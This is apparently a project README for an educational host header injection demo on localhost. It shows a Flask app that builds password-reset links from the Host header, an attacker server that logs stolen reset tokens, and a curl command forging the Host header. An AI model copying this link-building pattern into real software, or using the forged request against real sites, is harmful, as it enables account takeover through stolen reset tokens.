# Host header injection example

This project is an educational demonstration of the host header injection vulnerability
Demo is ran on 127.0.0.1:5000 and doesnt attack real systems.
The attacker server is ran on 127.0.0.1:8000
## Technologies used

```
-python
-flask
-curl
-werkzeug password hashing
-css
-smtplib

```

## Vulnerable app description
The app has login and forgot password functionalities, there is no register option to add new users you need to edit "users" dict inside [app.py](app.py) which act's as our db.
Vulnerability is in this part of the [app.py](app.py) code where the reset link is formed based on HTTP Host header. And since the client can change Host header attacker can make the app generate a reset link which leads to his server.
```
host = request.headers.get("Host")
reset_link = f"http://{host}/reset-password?token={token}"
```
## Attacker server description

Server steals token from victim, and then stores it in a text file.
Attacker's server is on port 8000.
This code returns user's token from the URL:
```
token = request.args.get("token")
```

## Real email imlemention
The application includes a real email sending functionality using Python’s built-in smtplib library. When a user requests a password reset, the system generates a reset link and sends it directly to the user’s email address via SMTP.


## Demo tutorial

First download all required libraries by using this command:
```
pip install -r requirements.txt
```
make sure you are in the same directory as the requirements.txt file

Start [app.py](app.py)
```
python app.py
```
Start [attacker.py](Attacker.py)
```
python attacker.py
```

Send the request with modified HOST to the real server
```
curl -i -X POST http://127.0.0.1:5000/forgot-password -H "Host: 127.0.0.1:8000" -d "email=victim@gmail.com"
```

Server will send an email to the victim with the modified reset password url, if the victim presses the link attacker will get the token.

